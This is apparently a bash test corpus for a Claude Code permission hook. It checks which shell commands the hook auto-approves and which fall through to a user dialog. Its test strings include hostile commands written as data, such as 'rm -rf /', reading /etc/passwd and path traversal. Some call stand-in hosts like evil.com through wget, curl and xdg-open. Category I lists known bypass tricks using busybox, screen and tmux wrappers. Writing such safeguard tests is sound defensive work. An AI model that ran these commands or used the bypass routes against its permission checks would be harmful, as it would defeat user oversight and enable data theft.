#!/bin/bash
# Test corpus for permission-fallback.sh hook validation
#
# Usage: ./scripts/test_permission_hook.sh
#
# Tests the PermissionRequest hook by piping JSON input and checking output.
# Expected results:
#   "allow" = hook outputs JSON with behavior:allow
#   "dialog" = hook exits 0 with no JSON output (falls through to dialog)

set -euo pipefail

HOOK_PATH="${HOOK_PATH:-.claude/hooks/permission-fallback.sh}"
PROJECT_DIR="$(cd "$(dirname "$0")/.." && pwd)"

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

PASS_COUNT=0
FAIL_COUNT=0
TOTAL_COUNT=0

# Test helper: pipe JSON to hook, check if output contains "allow"
test_case() {
  local COMMAND="$1"
  local EXPECTED="$2"
  local DESCRIPTION="$3"

  ((TOTAL_COUNT++)) || true

  # Build JSON input
  local JSON_INPUT
  JSON_INPUT=$(jq -n --arg cmd "$COMMAND" '{
    tool_name: "Bash",
    tool_input: {command: $cmd},
    hook_event_name: "PermissionRequest"
  }')

  # Run hook with CLAUDE_PROJECT_DIR set
  local OUTPUT
  OUTPUT=$(echo "$JSON_INPUT" | CLAUDE_PROJECT_DIR="$PROJECT_DIR" "$HOOK_PATH" 2>/dev/null || true)

  # Check result
  local ACTUAL
  if [[ -n "$OUTPUT" ]] && echo "$OUTPUT" | jq -e '.hookSpecificOutput.decision.behavior == "allow"' >/dev/null 2>&1; then
    ACTUAL="allow"
  else
    ACTUAL="dialog"
  fi

  # Compare
  if [[ "$ACTUAL" == "$EXPECTED" ]]; then
    echo -e "${GREEN}✓${NC} $DESCRIPTION"
    ((PASS_COUNT++)) || true
  else
    echo -e "${RED}✗${NC} $DESCRIPTION"
    echo "  Command: $COMMAND"
    echo "  Expected: $EXPECTED, Got: $ACTUAL"
    ((FAIL_COUNT++)) || true
  fi
}

echo "=========================================="
echo "Permission Hook Test Corpus"
echo "Hook: $HOOK_PATH"
echo "Project: $PROJECT_DIR"
echo "=========================================="
echo ""

# =============================================================================
# Category A: Phase 1-2 Regression Tests (15 cases)
# Ensure existing shell syntax guards still work
# =============================================================================
echo "=== Category A: Phase 1-2 Shell Syntax Guards (15 tests) ==="
echo ""

test_case "ls | grep foo" "dialog" "A1: Pipe operator blocked by P1"
test_case "echo hello; rm -rf /" "dialog" "A2: Semicolon operator blocked by P1"
test_case "sleep 5 &" "dialog" "A3: Background operator blocked by P1"
test_case "echo \`whoami\`" "dialog" "A4: Backtick expansion blocked by P1"
test_case "cat file > output.txt" "dialog" "A5: Redirect operator blocked by P2"
test_case "cat < input.txt" "dialog" "A6: Input redirect blocked by P2"
test_case "echo \$(pwd)" "dialog" "A7: Command substitution blocked by P3"
test_case "echo \$HOME" "dialog" "A8: Variable expansion blocked by P4"
test_case "PATH=/evil ls" "dialog" "A9: Environment assignment blocked by P5"
test_case "cat ~/file.txt" "dialog" "A10: Tilde expansion blocked by P6"
test_case "ls *.txt" "dialog" "A11: Glob star blocked by P7"
test_case "rm file?.txt" "dialog" "A12: Glob question mark blocked by P7"
test_case "cat file[12].txt" "dialog" "A13: Glob bracket blocked by P7"
test_case "echo {a,b,c}" "dialog" "A14: Brace expansion blocked by P7"
test_case "true && not-stripped" "dialog" "A15: && without echo suffix not stripped"

echo ""

# =============================================================================
# Category B: Phase 3-6 Regression Tests (15 cases)
# Interpreter + script path approval (existing functionality)
# =============================================================================
echo "=== Category B: Phase 3-6 Interpreter+Script Approval (15 tests) ==="
echo ""

test_case "python3 scripts/test.py" "allow" "B1: python3 with scripts/ path"
test_case "bash scripts/build.sh" "allow" "B2: bash with scripts/ path"
test_case "sh scripts/deploy.sh" "allow" "B3: sh with scripts/ path"
test_case "python3 -u scripts/worker.py" "allow" "B4: python3 with safe flag -u"
test_case "python3 -B -O scripts/optimize.py" "allow" "B5: python3 with multiple safe flags"
test_case "./scripts/new_cmd.sh" "allow" "B6: Direct script execution (shebang)"
test_case "bash .claude/hooks/test.sh" "allow" "B7: bash with .claude/hooks/ path"
test_case "python3 .claude/hooks/helper.py" "allow" "B8: python3 with .claude/hooks/ path"
test_case "python3 -c 'print(1)'" "dialog" "B9: python3 -c blocked (code injection)"
test_case "python3 -e code" "dialog" "B10: python3 -e blocked"
test_case "python3 -m http.server" "dialog" "B11: python3 -m blocked"
test_case "bash -c 'echo hi'" "dialog" "B12: bash -c blocked"
test_case "python3 evil.py" "dialog" "B13: script outside scripts/ rejected"
test_case "python3 /tmp/malicious.py" "dialog" "B14: absolute path outside project rejected"
test_case "python3 scripts/../work/evil.py" "dialog" "B15: path traversal to work/ rejected"

echo ""

# =============================================================================
# Category C: Phase 7 — Tier 1 Auto-Approve (30 cases)
# Commands that SHOULD auto-approve (will FAIL until Phase 7 is implemented)
# =============================================================================
echo "=== Category C: Phase 7 Tier 1 - Safe File Inspection (30 tests) ==="
echo ""

# File inspection commands with project paths
test_case "find work/ -name test.md" "allow" "C1: find with project-local path (PHASE 7)"
test_case "stat config.yaml" "allow" "C2: stat on project file (PHASE 7)"
test_case "tree docs/" "allow" "C3: tree on project directory (PHASE 7)"
test_case "file scripts/test.py" "allow" "C4: file on project script (PHASE 7)"
test_case "du -sh work/" "allow" "C5: du on project directory (PHASE 7)"
test_case "wc -l config.yaml" "allow" "C6: wc on project file (PHASE 7)"
test_case "head -n 10 README.md" "allow" "C7: head on project file (PHASE 7)"
test_case "tail -f work/logs/output.log" "allow" "C8: tail on project log (PHASE 7)"
test_case "cat docs/guide.md" "allow" "C9: cat on project doc (PHASE 7)"
test_case "ls -la work/" "allow" "C10: ls on project directory (PHASE 7)"

# Text processing commands
test_case "sort work/results/data.txt" "allow" "C11: sort on project file (PHASE 7)"
test_case "uniq work/output.txt" "allow" "C12: uniq on project file (PHASE 7)"
test_case "cut -d, -f1 work/data.csv" "allow" "C13: cut on project CSV (PHASE 7)"
test_case "jq .version config.yaml" "allow" "C14: jq on project config (PHASE 7)"
test_case "grep TODO docs/guide.md" "allow" "C15: grep on project file (PHASE 7)"
test_case "diff work/v1.txt work/v2.txt" "allow" "C16: diff on project files (PHASE 7)"
test_case "awk '{print}' work/data.txt" "dialog" "C17: awk blocked by braces in P7 (shell syntax)"

# Utilities with no path arguments or pure computational
test_case "date" "allow" "C18: date (no arguments) (PHASE 7)"
test_case "which python3" "allow" "C19: which command (PHASE 7)"
test_case "echo hello" "allow" "C20: echo with literal string (PHASE 7)"
test_case "printf test" "allow" "C21: printf with literal (PHASE 7)"
test_case "basename work/results/output.txt" "allow" "C22: basename on project path (PHASE 7)"
test_case "dirname work/results/output.txt" "allow" "C23: dirname on project path (PHASE 7)"
test_case "realpath config.yaml" "allow" "C24: realpath on project file (PHASE 7)"
test_case "pwd" "allow" "C25: pwd (no arguments) (PHASE 7)"
test_case "whoami" "allow" "C26: whoami (no arguments) (PHASE 7)"
test_case "id" "allow" "C27: id (no arguments) (PHASE 7)"
test_case "sleep 5" "allow" "C28: sleep with numeric argument (PHASE 7)"
test_case "seq 1 10" "allow" "C29: seq with numeric range (PHASE 7)"
test_case "true" "allow" "C30: true builtin (PHASE 7)"

echo ""

# =============================================================================
# Category D: Phase 7 Tier 2 Always-Ask (15 cases)
# Commands with external effects that should trigger dialog
# =============================================================================
echo "=== Category D: Phase 7 Tier 2 - External Effects (15 tests) ==="
echo ""

# Network commands
test_case "curl https://example.com" "dialog" "D1: curl URL triggers dialog"
test_case "wget https://example.com/file.tar.gz" "dialog" "D2: wget URL triggers dialog"
test_case "ssh user@host" "dialog" "D3: ssh triggers dialog"
test_case "ping 8.8.8.8" "allow" "D4: ping not in trimmed ALWAYS_ASK (read-only diagnostic)"
test_case "nc -l 8080" "dialog" "D5: netcat triggers dialog"

# Privilege escalation
test_case "sudo ls" "dialog" "D6: sudo triggers dialog"
test_case "su root" "dialog" "D7: su triggers dialog"
test_case "doas ls" "allow" "D8: doas not in trimmed ALWAYS_ASK (rare BSD, user-managed)"

# Package managers
test_case "npm install" "dialog" "D9: npm install triggers dialog"
test_case "pip install requests" "dialog" "D10: pip install triggers dialog"
test_case "apt-get update" "dialog" "D11: apt-get triggers dialog"
test_case "brew install jq" "allow" "D12: brew not in trimmed ALWAYS_ASK (platform-specific, user-managed)"

# Process/execution commands
test_case "docker run alpine" "allow" "D13: docker not in ALWAYS_ASK (container tools user-managed)"
test_case "kill 12345" "allow" "D14: kill not in ALWAYS_ASK (no path args, no network)"
test_case "xargs echo" "dialog" "D15: xargs triggers dialog"

echo ""

# =============================================================================
# Category E: Phase 7 Path Containment (15 cases)
# Test boundary between in-project and out-of-project paths
# =============================================================================
echo "=== Category E: Phase 7 - Path Containment Checks (15 tests) ==="
echo ""

# Outside project - should trigger dialog
test_case "cat /etc/passwd" "dialog" "E1: absolute path outside project"
test_case "ls /tmp/" "dialog" "E2: /tmp outside project"
test_case "find /home/other/ -name foo" "dialog" "E3: other user home outside project"
test_case "cat ../../../etc/passwd" "dialog" "E4: path traversal outside project"
test_case "rm /usr/local/bin/script" "dialog" "E5: system path outside project"

# Inside project - should auto-approve
test_case "cat work/results/output.txt" "allow" "E6: relative path in project (PHASE 7)"
test_case "ls ./docs/" "allow" "E7: dot-relative path in project (PHASE 7)"
test_case "cat $PROJECT_DIR/config.yaml" "allow" "E8: absolute project path (PHASE 7)"
test_case "mkdir work/new_dir" "allow" "E9: mkdir in project (PHASE 7)"
test_case "touch work/newfile.txt" "allow" "E10: touch in project (PHASE 7)"

# Edge cases
test_case "cat config.yaml" "allow" "E11: bare filename (resolves to project) (PHASE 7)"
test_case "basename /some/absolute/path" "dialog" "E12: basename with non-project path"
test_case "ls" "allow" "E13: ls with no path (operates on cwd) (PHASE 7)"
test_case "pwd" "allow" "E14: pwd (no paths) (PHASE 7)"
test_case "find . -type f" "allow" "E15: find with . (no globs, . resolves to project dir)"

echo ""

# =============================================================================
# Category F: Phase 1.5 Safe Suffix Stripping (10 cases)
# Commands with safe trailing suffixes should pass through
# =============================================================================
echo "=== Category F: Phase 1.5 - Safe Suffix Combinations (10 tests) ==="
echo ""

test_case "python3 scripts/test.py 2>&1" "allow" "F1: script with 2>&1 suffix"
test_case "bash scripts/build.sh 2>/dev/null" "allow" "F2: script with 2>/dev/null suffix"
test_case "python3 scripts/worker.py || true" "allow" "F3: script with || true suffix"
test_case "sh scripts/deploy.sh && echo 'done'" "allow" "F4: script with && echo suffix"
test_case "stat config.yaml || true" "allow" "F5: stat with || true (PHASE 7)"
test_case "cat docs/guide.md 2>/dev/null" "allow" "F6: cat with 2>/dev/null (PHASE 7)"
test_case "python3 scripts/test.py 2>&1 || true" "allow" "F7: multiple suffixes combined"
test_case "bash scripts/check.sh || echo 'failed'" "allow" "F8: || echo with literal"
test_case "python3 scripts/runner.py 2>/dev/null || true" "allow" "F9: 2>/dev/null + || true"
test_case "stat work/foo 2>&1 || echo 'missing'" "allow" "F10: stat + suffix combo (PHASE 7)"

echo ""

# =============================================================================
# Category G: Edge Cases & Adversarial Tests (20 cases)
# =============================================================================
echo "=== Category G: Edge Cases & Adversarial Attempts (20 tests) ==="
echo ""

# Boundary conditions
test_case "" "dialog" "G1: empty command"
test_case "find" "allow" "G2: find with no args (not in ALWAYS_ASK, no path args)"
test_case "python3" "dialog" "G3: interpreter with no script"
test_case "bash -n scripts/test.sh" "allow" "G4: bash -n (syntax check, safe flag)"

# Full paths to executables (command itself is full path)
test_case "/usr/bin/find work/ -name foo" "allow" "G5: full path resolved via basename to find (PHASE 7)"
test_case "/bin/cat config.yaml" "allow" "G6: full path resolved via basename to cat (PHASE 7)"

# Flags that look like paths
test_case "ls -la" "allow" "G7: ls with flags only (PHASE 7)"
test_case "wc --help" "allow" "G8: wc with --help (PHASE 7)"

# Unicode and special characters
test_case "echo héllo" "allow" "G9: unicode in arguments (PHASE 7)"
test_case "cat work/file-name.txt" "allow" "G10: hyphenated filename (PHASE 7)"

# Very long commands
test_case "find work/cmd_001/refine/results/very/deep/nested/path/that/goes/on/and/on/for/a/very/long/time -name output.md" "allow" "G11: very long project path (no globs, path in-project)"

# Commands with numerical arguments only
test_case "sleep 300" "allow" "G12: sleep with large number (PHASE 7)"
test_case "seq 1 1000000" "allow" "G13: seq with large range (PHASE 7)"

# Mixed safe and potentially unsafe
test_case "find work/ -name test.txt -delete" "allow" "G14: find -delete in project (no globs, flags skipped)"
test_case "rm work/old_output.txt" "allow" "G15: rm on project file (path-contained, like Edit/Write)"
test_case "chmod 644 work/script.sh" "allow" "G16: chmod in project (path-contained, user-managed)"
test_case "mv work/old.txt work/new.txt" "allow" "G17: mv within project (PHASE 7)"
test_case "cp config.yaml config.yaml.bak" "allow" "G18: cp within project (PHASE 7)"
test_case "mkdir -p work/new/nested/dir" "allow" "G19: mkdir -p in project (PHASE 7)"
test_case "ln -s work/a.md work/b.md" "allow" "G20: ln within project (path-contained, like cp)"

echo ""

# =============================================================================
# Category H: CHAOS - Genuinely Uncertain Cases (5 tests)
# These mark edge cases where the design decision is unclear
# =============================================================================
echo "=== Category H: CHAOS - Uncertain Edge Cases (5 tests) ==="
echo ""

# CHAOS: Should interpreters without scripts be allowed?
test_case "node" "dialog" "H1: node REPL invocation # CHAOS"

# CHAOS: Should we allow cd even though it changes state?
test_case "cd work/" "allow" "H2: cd to project directory (cd is no-op in subshell) # CHAOS"

# CHAOS: What about commands that read stdin but operate locally?
test_case "wc" "allow" "H3: wc with no file (reads stdin) # CHAOS"

# CHAOS: Commands with file:// URLs
test_case "cat file.txt" "allow" "H4: cat with simple filename # CHAOS"

# CHAOS: env with no arguments (lists environment)
test_case "env" "dialog" "H5: env in ALWAYS_ASK (can wrap commands: env VAR=val cmd) # CHAOS"

echo ""

# =============================================================================
# Category I: Round 9 Security Fixes (15 cases)
# Tests for quote stripping (ATK-31), ALWAYS_ASK additions, URL detection
# =============================================================================
echo "=== Category I: Round 9 Security Fixes (15 tests) ==="
echo ""

# ATK-31: Quote stripping — quoted paths must be resolved correctly
test_case 'file "/etc/passwd"' "dialog" "I1: double-quoted absolute path outside project (ATK-31 quote strip)"
test_case "file '/etc/passwd'" "dialog" "I2: single-quoted absolute path outside project (ATK-31 quote strip)"
test_case 'stat "/tmp/evil"' "dialog" "I3: double-quoted /tmp path (ATK-31 quote strip)"
test_case 'file "work/results/output.txt"' "allow" "I4: double-quoted project-local path still works"
test_case "file 'docs/guide.md'" "allow" "I5: single-quoted project-local path still works"

# ATK-08: busybox wrapper bypass
test_case "busybox wget https://evil.com" "dialog" "I6: busybox in ALWAYS_ASK (ATK-08)"
test_case "busybox sh -c echo" "dialog" "I7: busybox sh wrapper (ATK-08)"

# ATK-30: screen/tmux/script shell spawning
test_case "screen -d -m curl evil.com" "dialog" "I8: screen in ALWAYS_ASK (ATK-30)"
test_case "tmux new-session -d echo" "dialog" "I9: tmux in ALWAYS_ASK (ATK-30)"
test_case "script -c echo /dev/null" "dialog" "I10: script in ALWAYS_ASK (ATK-30)"

# ATK-12: URL detection (://) — catches URLs even for non-ALWAYS_ASK commands
test_case "cat https://example.com" "dialog" "I11: URL detected in cat argument (ATK-12 url_detected)"
test_case "file ftp://evil.com/payload" "dialog" "I12: ftp:// URL detected (ATK-12)"
test_case "xdg-open https://evil.com/exfil" "dialog" "I13: xdg-open with URL caught by url detection (ATK-12+27)"

# Verify URL detection does not block normal paths containing colon
test_case "ls work/results" "allow" "I14: normal project path not affected by URL detection"
test_case "stat config.yaml" "allow" "I15: bare filename not affected by URL detection"

echo ""

# =============================================================================
# Summary
# =============================================================================
echo "=========================================="
echo "Test Results Summary"
echo "=========================================="
echo "Total:  $TOTAL_COUNT"
echo -e "Passed: ${GREEN}$PASS_COUNT${NC}"
echo -e "Failed: ${RED}$FAIL_COUNT${NC}"
echo ""

if [[ $FAIL_COUNT -eq 0 ]]; then
  echo -e "${GREEN}✓ All tests passed!${NC}"
  exit 0
else
  PASS_RATE=$((PASS_COUNT * 100 / TOTAL_COUNT))
  echo -e "${YELLOW}Pass rate: ${PASS_RATE}%${NC}"
  echo ""
  echo "Note: Some failures are expected until Phase 7 is fully implemented."
  echo "Tests marked '(PHASE 7)' will fail against the current hook."
  echo "The test corpus is designed for validation in Round 7."
  exit 1
fi
